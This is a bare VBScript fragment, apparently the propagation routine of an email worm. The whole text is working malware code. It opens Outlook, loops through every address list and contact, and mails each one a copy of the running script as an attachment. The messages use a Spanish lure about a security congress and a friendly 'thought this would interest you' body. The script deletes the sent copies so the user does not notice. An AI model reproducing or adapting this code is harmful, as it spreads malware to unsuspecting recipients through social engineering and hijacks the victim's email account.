   Set ClienteCorreo = CreateObject("Outlook.Application")
   If ClienteCorreo = "Outlook" Then
     Set CorreoUsuario = ClienteCorreo.GetNameSpace("MAPI")
     Set AgendaUsuario = CorreoUsuario.AddressLists
     For Each Grupo In AgendaUsuario
       For Contacto = 1 to Grupo.AddressEntries.Count
         If Grupo.AddressEntries.Count <> 0 Then
           Set Mensaje = ClienteCorreo.CreateItem(0)
           Set Direccion = Grupo.AddressEntries(Contacto)
           Mensaje.To = Direccion.Address
           Mensaje.Subject = "RV: Congreso de seguridad eGallaecia'02 (http://www.e-gallaecia.com)"
           Mensaje.Body = "He recibido esta info, creo que te va a interesar."
           Set Adjunto = Mensaje.Attachments
           Adjunto.Add wscript.scriptfullname
           Mensaje.DeleteAfterSubmit = True
           If Mensaje.To <> "" Then Mensaje.Send
         End If
       Next
     Next
   End If
